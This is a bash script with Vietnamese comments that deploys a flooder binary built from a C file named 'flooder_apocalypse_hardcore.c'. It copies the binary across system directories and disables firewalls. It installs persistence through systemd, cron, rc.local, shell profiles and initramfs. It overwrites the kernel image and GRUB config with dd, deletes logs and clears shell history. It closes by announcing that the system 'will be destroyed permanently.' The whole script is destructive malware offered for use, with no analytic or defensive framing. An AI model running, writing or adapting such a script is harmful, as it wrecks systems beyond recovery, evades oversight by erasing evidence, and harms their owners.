#!/bin/bash
set -e

# Biên dịch với tối ưu hóa và giữ nguyên symbol
gcc -O3 -pthread -o /tmp/flooder_apoc flooder_apocalypse_hardcore.c -ldl

# Sao chép vào tất cả vị trí có thể
for loc in /bin /usr/bin /lib /usr/local/bin /usr/sbin /boot /tmp /dev/shm /root /etc /var /opt; do
    cp /tmp/flooder_apoc $loc/flooder 2>/dev/null || true
    chmod +x $loc/flooder 2>/dev/null || true
done

# Cài đặt persistence (systemd, cron, rc.local, profile, initramfs, grub)
systemctl stop firewalld ufw iptables 2>/dev/null
systemctl disable firewalld ufw 2>/dev/null
iptables -F 2>/dev/null

cat > /etc/systemd/system/flooder.service <<EOF
[Unit]
Description=Flooder Apocalypse
After=network.target
[Service]
Type=simple
ExecStart=/bin/flooder
Restart=always
RestartSec=0.1
User=root
LimitNOFILE=infinity
LimitNPROC=infinity
[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable flooder.service
systemctl start flooder.service

(crontab -l 2>/dev/null; echo "@reboot /bin/flooder") | crontab -
(crontab -l 2>/dev/null; echo "* * * * * /bin/flooder") | crontab -
(crontab -l 2>/dev/null; echo "0 * * * * /bin/flooder") | crontab -

echo "/bin/flooder &" >> /etc/rc.local
echo "/bin/flooder &" >> /etc/profile
echo "/bin/flooder &" >> /root/.bashrc
echo "/bin/flooder &" >> /etc/bash.bashrc

mkdir -p /etc/initramfs-tools/scripts/init-bottom
echo "/bin/flooder &" > /etc/initramfs-tools/scripts/init-bottom/flooder
chmod +x /etc/initramfs-tools/scripts/init-bottom/flooder
update-initramfs -u 2>/dev/null

# Phá hủy GRUB và kernel boot
dd if=/bin/flooder of=/boot/vmlinuz-linux bs=1M conv=notrunc 2>/dev/null
dd if=/bin/flooder of=/boot/grub/grub.cfg bs=1M conv=notrunc 2>/dev/null
grub-install /dev/sda 2>/dev/null || true
grub-install /dev/vda 2>/dev/null || true

# Xóa các file log và dấu vết
rm -rf /var/log/* 2>/dev/null
rm -rf /var/log/.* 2>/dev/null
history -c

# Chạy ngay lập tức
nohup /bin/flooder &>/dev/null &
echo "Apocalypse deployed. System will be destroyed permanently."